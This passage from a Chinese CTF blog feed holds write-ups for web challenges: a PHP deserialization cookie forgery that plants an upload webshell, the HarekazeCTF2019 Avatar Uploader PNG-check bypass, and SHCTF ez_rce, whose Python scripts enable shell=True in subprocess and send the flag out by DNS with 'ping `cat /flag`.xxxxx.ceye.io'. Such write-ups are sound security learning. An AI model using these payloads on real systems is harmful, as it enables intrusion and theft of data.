class="hljs-variable">$a</span>-&gt;checker-&gt;ext=<span class="hljs-number">1</span>;   <span class="hljs-comment">//进入upload_img()中的第三个if</span><br><span class="hljs-variable">$a</span>-&gt;checker-&gt;filename_tmp=<span class="hljs-string">&quot;./upload/c7129430ace4c05bd5bcee0bd02b538b/0a7b8575f81e6d28645879810e6f43a9.png&quot;</span>;<span class="hljs-comment">//这里路径要注意，在网页源代码中得到的路径是基于/index.php/home.html的，文件操作源码的路径是/Profile.php，所以要去掉一个点</span><br><span class="hljs-variable">$a</span>-&gt;checker-&gt;filename=<span class="hljs-string">&quot;./upload/shell.php&quot;</span>;     <span class="hljs-comment">//图片马的目标转移位置</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>用生成的序列化字符串替换cookie</p><p><img src="https://s2.loli.net/2024/07/23/dw9T2ifeqmC4jQy.png"></p><p>然后刷新网页。</p><p>访问http:/xxxxxxxxxxxxxxxx.node5.buuoj.cn/upload/shell.php</p><p><img src="https://s2.loli.net/2024/07/23/ayZmuljkOwB8evV.png"></p><p>之后蚁剑连接-&gt;读取flag即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>代码审计</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HarekazeCTF2019 Avatar Uploader 1</title>
    <link href="/2024/07/07/%5BHarekazeCTF2019%5DAvatar%20Uploader%201/"/>
    <url>/2024/07/07/%5BHarekazeCTF2019%5DAvatar%20Uploader%201/</url>
    
    <content type="html"><![CDATA[<h3 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h3><p>原题中是给出源码的</p><p>主要看upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);<br><br><span class="hljs-variable">$session</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureClientSession</span>(CLIENT_SESSION_ID, SECRET_KEY);<br><br><span class="hljs-comment">// check whether file is uploaded</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file size</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file type</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-title function_ invoke__">finfo_close</span>(<span class="hljs-variable">$finfo</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file width/height</span><br><span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || <span class="hljs-variable">$size</span>[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br>  <span class="hljs-comment">// I hope this never happens...</span><br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ok</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>);<br><br><span class="hljs-variable">$session</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;avatar&#x27;</span>, <span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">flash</span>(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);<br><span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></td></tr></table></figure><p>关键在这部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// check file type</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-title function_ invoke__">finfo_close</span>(<span class="hljs-variable">$finfo</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file width/height</span><br><span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || <span class="hljs-variable">$size</span>[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br>  <span class="hljs-comment">// I hope this never happens...</span><br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据代码意思，</p><p>如果上传的图片使<code>finfo_file()</code>判断为png，</p><p><code>getimagesize()</code>判断为非png，</p><p>那么就可以得到flag。</p><p><code>finfo_file()</code>只根据文件头部的特殊标识符判断文件类型。</p><p><code>getimagesize()</code>会通过读取图片文件的头部信息来确定图片的大小和类型。</p><p>所以可以上传一个只有文件头部的特殊标识符的文件，</p><p>由于没有宽高等信息，<code>getimagesize()</code>将会读取失败，</p><p>满足<code>$size[2] !== IMAGETYPE_PNG</code>，得到flag。</p><p><img src="https://s2.loli.net/2024/07/13/qUQGPcSxWzCIvm8.webp"></p><p><img src="https://s2.loli.net/2024/07/13/6tcVznl9Lbv4ukT.webp"></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHCTF 2023 week2 web ez_rce</title>
    <link href="/2023/10/14/SHCTF-week2-web-ez_rce/"/>
    <url>/2023/10/14/SHCTF-week2-web-ez_rce/</url>
    
    <content type="html"><![CDATA[<h1 id="SHCTF-2023-week2-web-ez-rce"><a href="#SHCTF-2023-week2-web-ez-rce" class="headerlink" title="[SHCTF 2023] week2 web ez_rce"></a>[SHCTF 2023] week2 web ez_rce</h1><p>题目源码(附件)如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gett</span>(<span class="hljs-params">obj,arg</span>):<br>    tmp = obj<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>        tmp = <span class="hljs-built_in">getattr</span>(tmp,i)<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sett</span>(<span class="hljs-params">obj,arg,num</span>):<br>    tmp = obj<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(arg)-<span class="hljs-number">1</span>):<br>        tmp = <span class="hljs-built_in">getattr</span>(tmp,arg[i])<br>    <span class="hljs-built_in">setattr</span>(tmp,arg[i+<span class="hljs-number">1</span>],num)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>(<span class="hljs-params">giveme,num,bol</span>):<br>    c = gett(subprocess,giveme)<br>    tmp = <span class="hljs-built_in">list</span>(c)<br>    tmp[num] = bol<br>    tmp = <span class="hljs-built_in">tuple</span>(tmp)<br>    sett(subprocess,giveme,tmp)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">arg</span>):<br>    subprocess.call(arg)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;exec&#x27;</span>)==<span class="hljs-string">&#x27;ok&#x27;</span>:<br>            shell = request.args.get(<span class="hljs-string">&#x27;shell&#x27;</span>)<br>            cmd(shell)<br>        <span class="hljs-keyword">else</span>:<br>            exp = <span class="hljs-built_in">list</span>(request.get_json()[<span class="hljs-string">&#x27;exp&#x27;</span>])<br>            num = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">&#x27;num&#x27;</span>))<br>            bol = <span class="hljs-built_in">bool</span>(request.args.get(<span class="hljs-string">&#x27;bol&#x27;</span>))<br>            hint(exp,num,bol)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>以下内容来自<a href="https://yiyan.baidu.com/">文心一言 </a></p><h3 id="整体"><a href="#整体" class="headerlink" title="整体"></a>整体</h3><blockquote><p>这段代码是一个基于 Flask 的 web 服务程序，它允许用户通过 web 请求执行一些操作。以下是代码的逐行详细分析：</p><ol><li><code>from flask import *</code>：从 Flask 模块导入所有内容。这将导入 Flask 框架的所有功能和类。</li><li><code>import subprocess</code>：导入 subprocess 模块，这个模块允许你从 Python 代码中执行外部命令。</li><li><code>app = Flask(__name__)</code>：创建一个 Flask web 服务实例。</li></ol><p>4-7. <code>def gett(obj,arg):</code>：定义一个函数 gett，它接收两个参数，一个对象和一个参数列表。函数通过 getattr 函数递归地获取对象的属性。</p><p>8-12. <code>def sett(obj,arg,num):</code>：定义一个函数 sett，它接收一个对象，一个参数列表和一个数值。函数通过 getattr 函数递归地获取对象的属性，并使用 setattr 函数设置最后一个属性的值。</p><p>13-19. <code>def hint(giveme,num,bol):</code>：定义一个函数 hint，它接收一个参数列表，一个数值和一个布尔值。函数首先使用 gett 函数获取 subprocess 模块的某个属性，然后修改这个属性的某个元素的值，并使用 sett 函数设置新的值。</p><p>20-22. <code>def cmd(arg):</code>：定义一个函数 cmd，它接收一个参数列表，并使用 subprocess.call 函数执行外部命令。</p><p>24-34. <code>@app.route(&#39;/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>：定义一个路由，处理 ‘/‘ 路径的 GET 和 POST 请求。请求处理函数首先检查请求参数 ‘exec’，如果它的值为 ‘ok’，则执行外部命令。否则，它从请求的 JSON 数据中获取一个表达式列表，一个数值和一个布尔值，并使用 hint 函数修改 subprocess 模块的某个属性的值。</p><p>35-37. <code>if __name__ == &#39;__main__&#39;:</code>：如果代码作为主程序运行，则启动 Flask web 服务，监听所有 IP 地址的 5000 端口。</p><p>总的来说，这段代码的功能比较模糊，它似乎允许用户通过 web 请求执行外部命令，并修改 subprocess 模块的某些属性的值。这可能是一个潜在的安全风险，因为恶意用户可以利用这个功能执行任意命令。</p></blockquote><h3 id="hint-、gett-、sett"><a href="#hint-、gett-、sett" class="headerlink" title="hint() 、gett()、sett()"></a>hint() 、gett()、sett()</h3><blockquote><p><code>hint</code>、<code>gett</code>和<code>sett</code>三个函数结合在一起，可以实现通过字符串形式的属性名来动态地获取和设置对象的属性值。</p><p><code>gett</code>函数通过递归调用<code>getattr</code>函数，可以获取对象的嵌套属性。例如，如果有一个对象<code>obj</code>，它有一个属性<code>a</code>，属性<code>a</code>又有一个属性<code>b</code>，那么我们可以通过调用<code>gett(obj, [&#39;a&#39;, &#39;b&#39;])</code>来获取<code>obj.a.b</code>的值。</p><p><code>sett</code>函数和<code>gett</code>函数类似，它也可以通过递归调用<code>getattr</code>函数来获取对象的嵌套属性，然后使用<code>setattr</code>函数来设置最后一个属性的值。例如，如果我们要将<code>obj.a.b</code>的值设置为<code>123</code>，可以通过调用<code>sett(obj, [&#39;a&#39;, &#39;b&#39;], 123)</code>来实现。</p><p><code>hint</code>函数则是利用了<code>gett</code>和<code>sett</code>函数来实现对<code>subprocess</code>模块的某个属性的修改。它首先用<code>gett</code>函数获取到属性的值，然后修改其中的某个元素，最后再用<code>sett</code>函数设置回去。</p><p>举一个例子来说明这三个函数的结合使用：</p><p>假设我们有一个对象<code>obj</code>，它有一个嵌套属性<code>a.b.c</code>，我们想要将其值设置为<code>True</code>。可以先通过<code>gett(obj, [&#39;a&#39;, &#39;b&#39;])</code>获取到<code>obj.a.b</code>的值，然后将其属性<code>c</code>设置为<code>True</code>，最后再通过<code>sett(obj, [&#39;a&#39;, &#39;b&#39;], new_value)</code>将新的值设置回去。其中，<code>new_value</code>就是修改后的<code>obj.a.b</code>的值。</p><p>以上就是对<code>hint</code>、<code>gett</code>和<code>sett</code>三个函数的结合分析和例子说明。</p></blockquote><h2 id="subprocess-call"><a href="#subprocess-call" class="headerlink" title="subprocess.call()"></a>subprocess.call()</h2><blockquote><p>执行由参数提供的命令,返回状态码<br>我们可以用数组作为参数运行命令,也可以用字符串作为参数运行命令(通过设置参数shell=True)<br>注意,参数shell默认为False</p></blockquote><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>利用<code>subprocess.call()</code>执行命令需要其默认参数<code>shell=True</code></p><p>而<code>hint()</code>函数恰好提供了对应的功能</p><p>接下来就是设法找到shell参数的位置</p><h5 id="寻找shell参数的位置"><a href="#寻找shell参数的位置" class="headerlink" title="寻找shell参数的位置"></a>寻找shell参数的位置</h5><p>在python中，函数也是一种对象</p><blockquote><p>Python确实有一个内置类型叫做 “function”，它代表了Python中的函数对象。</p><p>函数对象在Python中是一等公民，这意味着它们可以被赋值给变量，作为参数传递给其他函数，以及作为返回值返回。函数对象还具有一些内置方法和属性，例如 <code>__name__</code>、<code>__doc__</code> 和 <code>__call__</code>。</p></blockquote><p>其中一个内置方法：</p><blockquote><p><code>__defaults__</code>：函数的默认参数值的元组</p></blockquote><p>然而，这还不够</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">getattr</span>(subprocess.call,<span class="hljs-string">&quot;__defaults__&quot;</span>))<br><span class="hljs-comment">#None</span><br></code></pre></td></tr></table></figure><p>None表示空</p><p><em>山重水复疑无路，柳暗花明又一村</em></p><p>查询<code>subprocess</code>源码(subprocess.py)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">call</span>(<span class="hljs-params">*popenargs, **kwargs</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Run command with arguments.  Wait for command to complete, then</span><br><span class="hljs-string">    return the returncode attribute.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    The arguments are the same as for the Popen constructor.  Example:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    retcode = call([&quot;ls&quot;, &quot;-l&quot;])</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> Popen(*popenargs, **kwargs).wait()<br></code></pre></td></tr></table></figure><p>注意到调用了<code>Popen()</code>并把参数传了过去</p><p><code>popen</code>是一个对象(类)</p><p>这样操作会调用<code>Popen</code>中的魔术方法<code>__init__</code></p><p>其参数中同样有我们想要修改的<code>shell</code>参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">__init__(self, args, bufsize=<span class="hljs-number">0</span>, executable=<span class="hljs-literal">None</span>,<br>                 stdin=<span class="hljs-literal">None</span>, stdout=<span class="hljs-literal">None</span>, stderr=<span class="hljs-literal">None</span>,<br>                 preexec_fn=<span class="hljs-literal">None</span>, close_fds=<span class="hljs-literal">False</span>, shell=<span class="hljs-literal">False</span>,<br>                 cwd=<span class="hljs-literal">None</span>, env=<span class="hljs-literal">None</span>, universal_newlines=<span class="hljs-literal">False</span>,<br>                 startupinfo=<span class="hljs-literal">None</span>, creationflags=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">getattr</span>(subprocess.Popen.__init__,<span class="hljs-string">&quot;__defaults__&quot;</span>))<br><span class="hljs-comment">#(-1, None, None, None, None, None, True, False, None, None, None, None, 0, True, False, ())</span><br></code></pre></td></tr></table></figure><p>经多次测试，其中下标为7处的元素为默认参数<code>shell</code>的值</p><p>更改参数脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> json  <br>  <br>data = &#123;  <br>    <span class="hljs-string">&quot;exp&quot;</span>: [<span class="hljs-string">&quot;Popen&quot;</span>,<span class="hljs-string">&quot;__init__&quot;</span>,<span class="hljs-string">&quot;__defaults__&quot;</span>]  <br>&#125;  <br>params=&#123;<br>    <span class="hljs-string">&#x27;num&#x27;</span>: <span class="hljs-string">&quot;7&quot;</span>,  <br>    <span class="hljs-string">&#x27;bol&#x27;</span>: <span class="hljs-literal">True</span>  <br>&#125;<br>r = requests.post(<span class="hljs-string">&#x27;http://127.0.0.1:5000/&#x27;</span>, json=data,params=params)  <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求头是：&quot;</span>, r.request.headers)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求体是：&quot;</span>, r.request.body)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="获取回显"><a href="#获取回显" class="headerlink" title="获取回显"></a>获取回显</h3><p>根据代码逻辑</p><p>命令执行是没有回显的</p><p>此时可以使用<strong>dns/http外带</strong>  </p><h4 id="dns-http外带"><a href="#dns-http外带" class="headerlink" title="dns/http外带"></a>dns/http外带</h4><p>需要平台</p><p>比如<a href="http://ceye.io/records/dns?_blank">CEYE - Monitor service for security testing</a>   </p><p>burpsuit也有类似功能</p><p>具体：<a href="https://cloud.tencent.com/developer/article/1956480?_blank">带外攻击OOB（RCE无回显骚思路总结）-腾讯云开发者社区-腾讯云 (tencent.com)</a>  </p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> json  <br>  <br>params=&#123;<br>    <span class="hljs-string">&#x27;exec&#x27;</span>: <span class="hljs-string">&quot;ok&quot;</span>,  <br>    <span class="hljs-string">&#x27;shell&#x27;</span>: <span class="hljs-string">&quot;ping -c 3 `cat /flag`.xxxxx.ceye.io&quot;</span>  <span class="hljs-comment">#-c 3 请求三次</span><br>&#125;<br>r = requests.get(<span class="hljs-string">&#x27;http://112.6.51.212:30434/&#x27;</span>, params=params)  <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求头是：&quot;</span>, r.request.headers)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求体是：&quot;</span>, r.request.body)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>命令执行过程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#发现flag文件</span><br><span class="hljs-built_in">ls</span> /|grep <span class="hljs-string">&#x27;f&#x27;</span>|<span class="hljs-built_in">base64</span> <span class="hljs-comment">#将根目录下以f开头的文件或文件夹以回车键隔开并进行base64编码</span><br><span class="hljs-comment">#读取flag</span><br><span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>先执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> json  <br>  <br>data = &#123;  <br>    <span class="hljs-string">&quot;exp&quot;</span>: [<span class="hljs-string">&quot;Popen&quot;</span>,<span class="hljs-string">&quot;__init__&quot;</span>,<span class="hljs-string">&quot;__defaults__&quot;</span>]  <br>&#125;  <br>params=&#123;<br>    <span class="hljs-string">&#x27;num&#x27;</span>: <span class="hljs-string">&quot;7&quot;</span>,  <br>    <span class="hljs-string">&#x27;bol&#x27;</span>: <span class="hljs-literal">True</span>  <br>&#125;<br>r = requests.post(<span class="hljs-string">&#x27;http://127.0.0.1:5000/&#x27;</span>, json=data,params=params)  <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求头是：&quot;</span>, r.request.headers)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求体是：&quot;</span>, r.request.body)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>再执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> json  <br>  <br>params=&#123;<br>    <span class="hljs-string">&#x27;exec&#x27;</span>: <span class="hljs-string">&quot;ok&quot;</span>,  <br>    <span class="hljs-string">&#x27;shell&#x27;</span>: <span class="hljs-string">&quot;ping -c 3 `cat /flag`.xxxxx.ceye.io&quot;</span>  <br>&#125;<br>r = 